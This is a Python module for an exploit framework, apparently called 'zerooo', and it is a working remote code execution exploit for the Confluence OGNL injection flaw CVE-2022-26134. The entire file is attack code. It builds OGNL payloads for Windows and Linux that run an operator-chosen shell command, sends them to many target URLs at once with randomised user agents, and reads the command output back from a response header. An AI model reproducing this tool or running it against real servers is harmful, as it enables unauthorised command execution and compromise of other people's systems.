from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient
from zerooo.utils.data import random_ua
from zerooo.utils.util import header_format_dict


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Confluence OGNL表达式注入命令执行漏洞',
            'Module': 'exploit/atlassian/confluence/cve-2022-26134-rce',
            'Product': 'Confluence',
            'Cve': '',
            'Create_date': '20220604',
            'Description': 'Confluence OGNL表达式注入命令执行漏洞',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'urls': {'Current Setting': OptArgset.urls, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'command': {'Current Setting': 'whoami', 'Required': 'yes', 'Description': '执行的系统命令'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'}
        }

    async def command_ognl(self, urls):
        command = self.get_options('command')
        # 判断系统版本
        win_payload = '''${{(%23a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("cmd /c {0}").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Response",%23a))}}/'''.format(
            command)
        linux_payload = '''${{(%23a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("sh -c {0}").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Response",%23a))}}/'''.format(
            command)
        vul_win_url = urls + win_payload
        vul_linux_url = urls + linux_payload
        headers = {'User-Agent': random_ua(), 'Accept': 'application/json, text/javascript, */*; q=0.01',
                   'Accept-Language': 'en-US,en;q=0.5'}
        # windows
        resp = await HttpClient().send_request_cgi('GET', headers=headers, url=vul_win_url)
        if resp:
            result = header_format_dict(resp['headers'])
            if 'X-Response' in result:
                LOGGER.info(urls)
                LOGGER.success(result['X-Response'])
                return resp

        # linux
        resp1 = await HttpClient().send_request_cgi('GET', headers=headers, url=vul_linux_url)
        if resp1:
            result1 = header_format_dict(resp1['headers'])
            if 'X-Response' in result1:
                LOGGER.info(urls)
                LOGGER.success(result1['X-Response'])
                return resp1

    @staticmethod
    def command_ognl_callback(future):
        resp = future.result()

    def exploit(self):
        urls = self.get_options('urls')
        limit = self.get_options('limit')
        async_run(self.command_ognl, urls, self.command_ognl_callback, limit)
        LOGGER.info('运行完成 (exploit complete)')
